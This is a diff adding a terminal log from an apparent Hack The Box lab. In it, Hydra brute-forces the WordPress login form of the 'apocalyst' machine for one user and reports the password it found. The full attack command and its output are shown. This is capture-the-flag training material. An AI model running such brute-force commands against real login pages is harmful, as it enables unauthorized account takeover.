@@ -1,0 +1,10 @@
+root@kali:~/htb/apocalyst# hydra -l falaraki -P list.txt apocalyst.htb http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fapocalyst.htb%2Fwp-admin%2F&testcookie=1:is incorrect."
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-01-14 04:39:43
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 486 login tries (l:1/p:486), ~31 tries per task
+[DATA] attacking http-post-form://apocalyst.htb:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fapocalyst.htb%2Fwp-admin%2F&testcookie=1:is incorrect.
+[80][http-post-form] host: apocalyst.htb   login: falaraki   password: Transclisiation
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-01-14 04:40:12
+
